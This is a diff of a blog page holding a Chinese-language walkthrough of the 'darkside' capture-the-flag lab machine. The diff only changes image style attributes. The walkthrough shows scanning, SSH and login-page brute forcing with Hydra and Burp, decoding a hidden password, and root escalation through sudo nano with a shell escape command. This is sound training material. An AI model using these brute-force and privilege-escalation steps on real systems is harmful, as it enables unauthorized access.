@@ -552,7 +552,7 @@ MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.69 seconds                                                 </pre></div>
 <p>优先查看<strong>http服务</strong>端口，<strong>ssh端口</strong>如果没有进展再进行爆破</p>
 <h1>2.踩点</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860"><img src="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860"><img src="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860" alt="image" style="max-width: 100%;"></a></p>
 <p>是个登录页，尝试<code class="notranslate">sql注入、万能密码、弱密码</code>均无果，使用<code class="notranslate">Nikto</code>进行WEB漏洞扫描</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nikto -h 192.168.205.134                       
@@ -576,7 +576,7 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 2.69 se
 ---------------------------------------------------------------------------
 + 1 host(s) tested</pre></div>
 <p>有个备份目录，我们去网页查看一下</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860"><img src="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860"><img src="https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860" alt="image" style="max-width: 100%;"></a></p>
 <p>只有一个<code class="notranslate">vote.txt</code>文本文件，给了我们几个用户名，我们拿这几个用户名去尝试爆破ssh服务</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.205.134/backup/vote.txt<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>:<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $1}<span class="pl-pds">'</span></span>
@@ -620,19 +620,19 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:
 [DATA] attacking ssh://192.168.205.134:22/
 </pre></div>
 <p>爆破的同时，我们用burp也爆破登录页</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9"><img src="https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9"><img src="https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9" alt="image" style="max-width: 100%;"></a></p>
 <p>选这个，设置好参数后启动爆破</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7"><img src="https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7"><img src="https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7" alt="image" style="max-width: 100%;"></a></p>
 <p>按照长度排序，可以发现该组用户密码长度明细不一样，尝试登录</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230"><img src="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230"><img src="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230" alt="image" style="max-width: 100%;"></a></p>
 <p>获得了一串类似于base64的字符串，拿去<a href="https://cyberchef.org/" rel="nofollow">cyberchef</a>解密</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230"><img src="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230"><img src="https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230" alt="image" style="max-width: 100%;"></a></p>
 <p>（尴尬了，是base58）输出了一串和网址很像的字符串，我们访问一下</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93"><img src="https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93"><img src="https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93" alt="image" style="max-width: 100%;"></a></p>
 <p>问我们选哪边，我们查看源码</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10"><img src="https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10"><img src="https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10" alt="image" style="max-width: 100%;"></a></p>
 <p>代码是实现了当存在名为 <strong>side</strong> 的 <strong>cookie</strong> 并且它的值是 <code class="notranslate">darkside</code>，那么脚本将重定向用户到 URL <code class="notranslate">hwvhysntovtanj.password</code>，我懒得改<strong>cookie</strong>了，我们直接访问</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce"><img src="https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce"><img src="https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce" alt="image" style="max-width: 100%;"></a></p>
 <p>获得了一个貌似是<strong>ssh服务</strong>密码，我们尝试一下</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh kevin@192.168.205.134  
@@ -695,9 +695,9 @@ User rijaba may run the following commands on darkside:
 </pre></div>
 <p>可以使用<strong>root</strong>运行<code class="notranslate">nano</code>，我们进行提权</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">rijaba@darkside:/home/kevin$ sudo /usr/bin/nano</pre></div>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78"><img src="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78" alt="image" style="max-width: 100%; height: auto;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78"><img src="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78" alt="image" style="max-width: 100%;"></a></p>
 <p>进入<code class="notranslate">nano</code>按<strong>CTRL+R</strong>，<strong>CTRL+X</strong>，输入<code class="notranslate">reset; sh 1&gt;&amp;0 2&gt;&amp;0</code>就提权成功了</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78"><img src="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78" alt="image" style="max-width: 100%; height: auto;"></a></p></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78"><img src="https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78" alt="image" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
